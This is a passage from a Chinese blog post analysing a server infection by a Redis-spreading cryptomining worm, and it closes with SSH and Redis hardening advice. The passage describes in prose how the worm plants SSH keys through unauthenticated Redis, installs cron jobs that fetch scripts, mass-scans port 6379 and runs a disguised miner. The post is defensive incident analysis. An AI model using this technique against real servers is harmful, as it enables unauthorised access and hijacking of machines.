</code></pre><p>如果说前两个脚本只是在服务器上下载执行了二进制文件，那这个脚本才真正显示病毒的威力。下面就来分析这个脚本。</p><p>一开始的修改系统环境没什么好说的，接下来的写文件操作有点眼熟，如果用过redis的人，应该能猜到，这里是对redis进行配置。写这个配置，自然也就是利用了redis把缓存内容写入本地文件的漏洞，结果就是用本地的私钥去登陆被写入公钥的服务器了，无需密码就可以登陆，也就是我们文章最开始的/root/.ssh/authorized_keys。登录之后就开始定期执行计划任务，下载脚本。好了，配置文件准备好了，就开始利用masscan进行全网扫描redis服务器，寻找肉鸡，注意看这6379就是redis服务器的默认端口，如果你的redis的监听端口是公网IP或是0.0.0.0，并且没有密码保护，不好意思，你就中招了。</p><p>通过依次分析这3个脚本，就能看出这个病毒的可怕之处，先是通过写入ssh public key 拿到登录权限，然后下载执行远程二进制文件，最后再通过redis漏洞复制，迅速在全网传播，以指数级速度增长。那么问题是，这台服务器是怎么中招的呢？看了下redis.conf，bind的地址是127.0.0.1，没啥问题。由此可以推断，应该是root帐号被暴力破解了，为了验证我的想法，我lastb看了一下，果然有大量的记录：</p><p><img loading=lazy src="https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUxRx7dZWNXxbgjEznbkJofHllQjbqvL9BicWIaGOnZplMJu4gh58Wa5Q/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt=图片></p><p>还剩最后一个问题，这个gpg-agentd程序到底是干什么的呢？我当时的第一个反应就是矿机，因为现在数字货币太火了，加大了分布式矿机的需求，也就催生了这条灰色产业链。于是，顺手把这个gpg-agentd拖到ida中，用string搜索bitcoin,eth, mine等相关单词，最终发现了这个：</p><p><img loading=lazy src="https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUFmZ3tXSY9KFwD2pcaJ7jbApwiaXFpZLDNHa1PjAFSNKUnNYcRxgbibrA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt=图片></p><p>打开 nicehash.com 看一下，一切都清晰了。</p><p><img loading=lazy src="https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUV5wDgVOIJYdib0DX3Zib4H5R85BCHtF4UNOzsW88smRs1CKOdmoSkujQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt=图片></p><p>一、服务器</p><blockquote><p>\1. 禁用ROOT
\2. 用户名和密码尽量复杂
\3. 修改ssh的默认22端口
\4. 安装DenyHosts防暴力破解软件
\5. 禁用密码登录，使用RSA公钥登录</p></blockquote><p>二、redis</p><blockquote><p>\1. 禁用公网IP监听，包括0.0.0.0
\2. 使用密码限制访问redis
\3. 使用较低权限帐号运行redis</p></blockquote><p>原文链接：https://mp.weixin.qq.com/s/FUv-7-1C30U-A81bDn8dbA</p></div><div class=post-reward><div style=padding:0;margin:0;width:100%;font-size:16px;text-align:center><div id=QR style=opacity:0><div id=wechat style=display:inline-block><a class=fancybox rel=group><img id=wechat_qr src=https://www.lvbibir.cn/img/wechat_pay.png alt=wechat_pay></a><p>微信</p></div><div id=alipay style=display:inline-block><a class=fancybox rel=group><img id=alipay_qr src=https://www.lvbibir.cn/img/alipay.png alt=alipay></a><p>支付宝</p></div></div><button id=rewardButton onclick='var qr=document.getElementById("QR");qr.style.opacity==="0"?qr.style.opacity="1":qr.style.opacity="0"'>
<span>🧧 鼓励</span></button></div></div><footer class=post-footer><nav class=paginav><a class=prev href=https://www.lvbibir.cn/posts/blog/wordpress-to-docker/><span class=title>« 上一页</span><br><span>wordpress迁移到docker</span></a>
<a class=next href=https://www.lvbibir.cn/posts/tech/centos7-deploy-benchmark/><span class=title>下一页 »</span><br><span>centos7基线检查平台部署</span></a></nav></footer></div><div><div class=pagination__title><span class=pagination__title-h style=font-size:20px>💬评论</span><hr></div><div id=tcomment></div><script src=https://cdn.staticfile.org/twikoo/1.6.7/twikoo.all.min.js></script><script>twikoo.init({envId:"https://twikoo.lvbibir.cn/",el:"#tcomment",lang:"zh-CN",path:window.TWIKOO_MAGIC_PATH||window.location.pathname})</script></div></article></main><footer class=footer><a href=https://gohugo.io/ target=_blank><img style=display:unset src=https://image.lvbibir.cn/blog/frame-hugo-blue.svg></a>
<a href=https://github.com/adityatelange/hugo-PaperMod target=_blank><img style=display:unset src=https://image.lvbibir.cn/blog/theme-papermod-lightgrey.svg></a>
<a href=https://cn.aliyun.com/ target=_blank><img style=display:unset src=https://image.lvbibir.cn/blog/图床-阿里云-orange.svg></a><br><span id=runtime_span></span>
<script type=text/javascript>function show_runtime(){window.setTimeout("show_runtime()",1e3),X=new Date("7/13/2021 1:00:00"),Y=new Date,T=Y.getTime()-X.getTime(),M=24*60*60*1e3,a=T/M,A=Math.floor(a),b=(a-A)*24,B=Math.floor(b),c=(b-B)*60,C=Math.floor((b-B)*60),D=Math.floor((c-C)*60),runtime_span.innerHTML="网站已运行"+A+"天"+B+"小时"+C+"分"+D+"秒"}show_runtime()</script>|
<script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script>
<span id=busuanzi_container>总访客数: <span id=busuanzi_value_site_uv></span>
|
总访问量: <span id=busuanzi_value_site_pv></span></span><br><a href=https://beian.miit.gov.cn/ target=_blank style="border-bottom:1px solid">京ICP备2021023168号-1</a>&nbsp;
|
<span>Copyright
&copy;
2020-2022
<a href=https://www.lvbibir.cn style="border-bottom:1px solid">lvbibir's Blog</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><span class=topInner><svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg><span id=read_progress></span></span></a>
<script>document.addEventListener("scroll",function(){const t=document.getElementById("read_progress"),n=document.documentElement.scrollHeight,s=document.documentElement.clientHeight,o=document.documentElement.scrollTop||document.body.scrollTop;t.innerText=((o/(n-s)).toFixed(2)*100).toFixed(0)})</script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>400||document.documentElement.scrollTop>400?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerText="📄复制";function s(){t.innerText="👌🏻已复制!",setTimeout(()=>{t.innerText="📄复制"},2e3)}t.addEventListener("click",t=>{const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>